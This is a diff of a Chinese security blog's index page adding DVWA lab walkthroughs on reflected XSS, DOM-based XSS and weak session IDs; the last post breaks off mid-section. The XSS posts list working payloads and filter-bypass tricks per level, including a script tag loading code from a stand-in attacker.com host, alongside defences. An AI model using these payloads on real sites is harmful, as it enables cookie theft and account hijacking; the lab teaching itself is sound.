@@ -120,7 +120,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">361</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">140</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">369</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">145</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -185,18 +185,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">140</span>
+          <span class="site-state-item-count">145</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">361</span>
+        <span class="site-state-item-count">369</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -221,6 +221,604 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/19/DVWA-XSS-Reflected%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/19/DVWA-XSS-Reflected%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA XSS Reflected 反射型XSS通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-19 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-19T10:00:00+08:00">2021-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>XSS（跨站脚本攻击），老牌漏洞了。简单说就是把恶意 JavaScript 注入到网页里，别人打开这个页面脚本就执行了。反射型 XSS 是最常见的，恶意代码通过 URL 参数传进去，服务器原样返回，浏览器就执行了。</p>
+<p>这关主要学怎么利用反射型 XSS 偷 Cookie 和搞事情。</p>
+<h2 id="XSS-类型"><a href="#XSS-类型" class="headerlink" title="XSS 类型"></a>XSS 类型</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型</td>
+<td>URL 传参，服务器反射回来</td>
+</tr>
+<tr>
+<td>存储型</td>
+<td>存服务器里，谁访问谁中招</td>
+</tr>
+<tr>
+<td>DOM 型</td>
+<td>纯前端操作，不经过服务器</td>
+</tr>
+</tbody></table>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用户输入直接输出，啥过滤都没有。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>测试 XSS：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>弹窗了，确认有 XSS。</p>
+<p>偷 Cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部加载脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://attacker.com/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>img 标签也行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>![图片占位]</p>
+<p>svg 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 过滤了 <code>&lt;script&gt;</code> 标签：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure>
+
+<p>用 <code>str_replace</code> 这种方式，绕过方法太多了。</p>
+<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>大小写混淆：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(&#x27;XSS&#x27;)&lt;/Script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>双写绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/scr&lt;/script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>中间的 <code>&lt;script&gt;</code> 被删了，剩下又拼成完整的标签了。</p>
+<p>或者干脆不用 <code>&lt;script&gt;</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;XSS&#x27;)&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别用正则过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure>
+
+<p>不管你怎么写 <code>&lt;script&gt;</code>，大小写怎么混，中间怎么插字符，都能匹配到并删掉。</p>
+<p>但 XSS 又不是只有 <code>&lt;script&gt;</code> 这一种。</p>
+<h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>img 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>svg 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>body 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>input 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;XSS&#x27;)&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<p>details 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>能触发 JS 的标签多了去了，过滤不过来的。</p>
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别用 <code>htmlspecialchars()</code> 转义：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure>
+
+<p>把 <code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&amp;</code> 这些特殊字符转成 HTML 实体，注入的代码就变成普通文本了。这才是正确的做法。</p>
+<h2 id="常用-XSS-Payload"><a href="#常用-XSS-Payload" class="headerlink" title="常用 XSS Payload"></a>常用 XSS Payload</h2><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>基础测试</td>
+</tr>
+<tr>
+<td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+<td>图片加载失败触发</td>
+</tr>
+<tr>
+<td><code>&lt;svg onload=alert(1)&gt;</code></td>
+<td>SVG 加载触发</td>
+</tr>
+<tr>
+<td><code>&lt;body onload=alert(1)&gt;</code></td>
+<td>页面加载触发</td>
+</tr>
+<tr>
+<td><code>&lt;input onfocus=alert(1) autofocus&gt;</code></td>
+<td>自动聚焦触发</td>
+</tr>
+<tr>
+<td><code>&lt;details open ontoggle=alert(1)&gt;</code></td>
+<td>展开触发</td>
+</tr>
+<tr>
+<td><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</code></td>
+<td>点击触发</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>XSS 防护要点：</p>
+<ol>
+<li>输出的时候用 <code>htmlspecialchars()</code> 转义</li>
+<li>Cookie 设置 HttpOnly</li>
+<li>配好 CSP</li>
+<li>别想着黑名单过滤，转义才是王道</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/17/DVWA-XSS-DOM-DOM%E5%9E%8BXSS%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/17/DVWA-XSS-DOM-DOM%E5%9E%8BXSS%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA XSS DOM DOM型XSS通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-17 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-17T10:00:00+08:00">2021-02-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>DOM 型 XSS 是个比较特殊的存在，攻击过程完全不经过服务器，纯前端搞定的。恶意代码通过 JavaScript 写进 DOM 里执行，服务端日志里都看不到啥异常。</p>
+<p>这关主要学怎么利用 DOM 型 XSS。</p>
+<h2 id="DOM-型-XSS-原理"><a href="#DOM-型-XSS-原理" class="headerlink" title="DOM 型 XSS 原理"></a>DOM 型 XSS 原理</h2><p>流程是这样的：</p>
+<ol>
+<li>攻击者搞个带恶意代码的 URL</li>
+<li>用户点进去，请求发到服务器</li>
+<li>服务器返回正常页面（恶意代码不在里面）</li>
+<li>浏览器执行 JS，从 URL 里读出恶意代码</li>
+<li>恶意代码被写进 DOM 执行</li>
+</ol>
+<p>服务器日志里看请求，发现不了 XSS 攻击痕迹。</p>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>Low 级别没服务端代码，纯前端 JavaScript：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;default&#x27;</span>) !== -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> lang = <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">split</span>(<span class="string">&#x27;default=&#x27;</span>)[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + lang + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>URL 参数 <code>default</code> 直接写进 DOM，一点过滤都没有。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>测试 XSS：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>![图片占位]</p>
+<p>弹窗了，注入成功。</p>
+<p>偷 Cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>![图片占位]</p>
+<p>也可以用 img 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 在服务端过滤了 <code>&lt;script</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span> ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>( <span class="string">&quot;location: ?default=English&quot;</span> );</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但 DOM 型 XSS 又不是只有 <code>&lt;script&gt;</code> 这一种姿势。</p>
+<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>用 img 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>![图片占位]</p>
+<p>用 svg 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>闭合 select 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>![图片占位]</p>
+<p>过滤 <code>&lt;script</code> 过滤了个寂寞。</p>
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别用白名单验证：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ] ) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="string">&quot;location: ?default=English&quot;</span> );</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只允许四个值，服务端过滤得挺死。但别忘了 URL 锚点。</p>
+<h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><p><code>#</code> 后面的东西不会发到服务器，但 JavaScript 能读到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>![图片占位]</p>
+<p>服务端只看到 <code>default=English</code>，白名单过了。但前端 JS 读的是整个 URL，后面的恶意代码照样执行。</p>
+<p>也可以用 input 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English#&lt;input onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别没特殊代码，但服务端白名单 + 前端转义：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) + <span class="number">8</span>);</span><br><span class="line">lang = lang.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>把 <code>&lt;</code> 和 <code>&gt;</code> 转义成 <code>&amp;lt;</code> 和 <code>&amp;gt;</code>，恶意代码就不会被当成 HTML 执行了。</p>
+<h2 id="DOM-型-XSS-常见位置"><a href="#DOM-型-XSS-常见位置" class="headerlink" title="DOM 型 XSS 常见位置"></a>DOM 型 XSS 常见位置</h2><table>
+<thead>
+<tr>
+<th>位置</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>document.location</code></td>
+<td>URL 参数</td>
+</tr>
+<tr>
+<td><code>document.URL</code></td>
+<td>完整 URL</td>
+</tr>
+<tr>
+<td><code>document.referrer</code></td>
+<td>来源页面</td>
+</tr>
+<tr>
+<td><code>document.cookie</code></td>
+<td>Cookie</td>
+</tr>
+<tr>
+<td><code>window.name</code></td>
+<td>窗口名称</td>
+</tr>
+<tr>
+<td><code>innerHTML</code></td>
+<td>HTML 内容</td>
+</tr>
+<tr>
+<td><code>document.write()</code></td>
+<td>直接写入 DOM</td>
+</tr>
+<tr>
+<td><code>eval()</code></td>
+<td>执行代码</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DOM 型 XSS 防护要点：</p>
+<ol>
+<li>前端对动态内容要做 HTML 实体编码</li>
+<li>能不用 <code>innerHTML</code>、<code>document.write()</code>、<code>eval()</code> 就别用</li>
+<li>用 <code>textContent</code> 代替 <code>innerHTML</code></li>
+<li>配好 CSP</li>
+<li>URL 参数别直接塞进 DOM</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/16/DVWA-Weak-Session-IDs%E5%BC%B1%E4%BC%9A%E8%AF%9DID%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/16/DVWA-Weak-Session-IDs%E5%BC%B1%E4%BC%9A%E8%AF%9DID%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA Weak Session IDs 弱会话ID通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-16 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-16T10:00:00+08:00">2021-02-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Session ID 是服务器识别用户身份的凭证，一般存在 Cookie 里。如果这个 ID 太简单、能猜出来，那攻击者就能冒充别的用户，这就是会话劫持。</p>
+<p>这关主要学怎么分析和利用弱会话 ID。</p>
+<h2 id="Session-基础知识"><a href="#Session-基础知识" class="headerlink" title="Session 基础知识"></a>Session 基础知识</h2><p>先搞清楚几个概念：</p>
+<table>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Session</td>
+<td>服务器端存用户会话数据</td>
+</tr>
+<tr>
+<td>Session ID</td>
+<td>标识会话的唯一字符串</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>浏览器存的小数据</td>
+</tr>
+<tr>
+<td>Session Cookie</td>
+<td>Cookie 里存的 Session ID</td>
+</tr>
+</tbody></table>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$session_id</span> = <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>( <span class="string">&#x27;dvwaSession&#x27;</span>, <span class="variable">$session_id</span> );</span><br></pre></td></tr></table></figure>
+
+<p>好家伙，Session ID 直接用自增数字，从 1 开始。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>打开开发者工具看 Cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dvwaSession=1</span><br><span class="line">dvwaSession=2</span><br><span class="line">dvwaSession=3</span><br></pre></td></tr></table></figure>
+
+<p>每次点一下就 +1，这也太好猜了。</p>
+<p>攻击者随便枚举就能猜到别人的 Session ID：</p>
